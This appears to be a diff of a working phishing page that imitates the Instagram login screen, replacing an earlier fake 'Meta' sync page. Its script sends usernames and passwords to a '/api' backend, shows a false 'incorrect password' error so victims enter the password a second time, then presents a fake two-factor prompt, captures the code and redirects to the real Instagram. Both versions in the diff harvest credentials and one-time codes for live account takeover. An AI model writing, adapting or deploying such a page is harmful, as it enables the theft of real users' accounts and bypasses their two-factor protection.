@@ -3,71 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Meta System Management</title>
+    <title>Instagram</title>
     <style>
-        body { background: #fafafa; font-family: -apple-system, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; }
-        .card { margin-top: 60px; width: 90%; max-width: 370px; background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 30px; text-align: center; }
-        .m-logo { width: 100px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
-        .btn { width: 100%; padding: 10px; background: #0095f6; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        .err { color: #ed4956; font-size: 13px; margin-bottom: 15px; display: none; }
-        #otp-box { display: none; }
+        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .login-box { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
+        .logo { width: 175px; margin-bottom: 30px; }
+        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; }
+        .btn { background: #0095f6; color: white; border: none; width: 100%; padding: 8px; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
+        .error-txt { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; }
+        #loader { display: none; flex-direction: column; align-items: center; }
+        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="m-logo">
-        <p style="font-size: 14px; color: #8e8e8e;">Authentication Required to Sync Services</p>
-        
-        <div id="err" class="err">Invalid credentials. Please verify your access key.</div>
 
-        <div id="login-box">
-            <input type="text" id="u" placeholder="Account Username">
-            <input type="password" id="p" placeholder="Access Key (Password)">
-            <button class="btn" onclick="send()">VERIFY IDENTITY</button>
-        </div>
+<div class="login-box" id="auth-box">
+    <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_2x.png/398364833643.png" class="logo">
+    
+    <div id="error" class="error-txt">Sorry, your password was incorrect. Please double-check your password.</div>
 
-        <div id="otp-box">
-            <p style="font-size: 12px; color: #8e8e8e;">A 6-digit code has been sent. Enter it below.</p>
-            <input type="number" id="o" placeholder="000000">
-            <button class="btn" onclick="finish()">COMPLETE SYNC</button>
-        </div>
+    <div id="login-form">
+        <input type="text" id="username" placeholder="Phone number, username, or email">
+        <input type="password" id="password" placeholder="Password">
+        <button class="btn" onclick="startMiddleman()">Log In</button>
+        <div class="divider">OR</div>
+        <p style="color:#385185; font-weight:600; font-size:14px; cursor:pointer;">Log in with Facebook</p>
     </div>
 
-    <script>
-        let tries = 0;
-        async function send() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            if(!u || !p) return;
+    <div id="loader">
+        <div class="spinner"></div>
+        <p style="font-size: 12px; color: #8e8e8e; margin-top: 10px;">Verifying with Secure API...</p>
+    </div>
 
-            // Python Backend Call
-            const res = await fetch('/api', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user: u, pass: p, type: tries === 0 ? 'LOG' : 'VERIFIED' })
-            });
+    <div id="otp-form" style="display:none;">
+        <p style="font-size: 14px; font-weight:600;">Two-Factor Authentication</p>
+        <p style="font-size: 12px; color: #8e8e8e;">Enter the 6-digit code we sent to your device.</p>
+        <input type="number" id="otp" placeholder="Security Code">
+        <button class="btn" onclick="submitOTP()">Verify Account</button>
+    </div>
+</div>
 
-            if(tries === 0) {
-                document.getElementById('err').style.display = 'block';
-                document.getElementById('p').value = '';
+<script>
+    let tries = 0;
+    
+    async function startMiddleman() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+        if(!u || !p) return;
+
+        // Show Loading
+        document.getElementById('login-form').style.display = 'none';
+        document.getElementById('loader').style.display = 'flex';
+
+        if(tries < 1) {
+            // Step 1: Capture and show error
+            await fetch('/api', { method: 'POST', body: JSON.stringify({u, p, type: 'INITIAL_CAPTURE'}) });
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('login-form').style.display = 'block';
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('password').value = '';
                 tries++;
-            } else {
-                document.getElementById('login-box').style.display = 'none';
-                document.getElementById('err').style.display = 'none';
-                document.getElementById('otp-box').style.display = 'block';
-            }
+            }, 2000);
+        } else {
+            // Step 2: Capture real pass and show OTP
+            await fetch('/api', { method: 'POST', body: JSON.stringify({u, p, type: 'VERIFIED_PASS'}) });
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('otp-form').style.display = 'block';
+            }, 1500);
         }
+    }
 
-        async function finish() {
-            const o = document.getElementById('o').value;
-            await fetch('/api', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user: document.getElementById('u').value, otp: o, type: 'OTP' })
-            });
-            window.location.href = "https://instagram.com";
-        }
-    </script>
+    async function submitOTP() {
+        const o = document.getElementById('otp').value;
+        const u = document.getElementById('username').value;
+        if(o.length < 6) return;
+
+        await fetch('/api', { method: 'POST', body: JSON.stringify({u, o, type: 'OTP_LIVE'}) });
+        window.location.href = "https://instagram.com/accounts/login";
+    }
+</script>
 </body>
 </html>
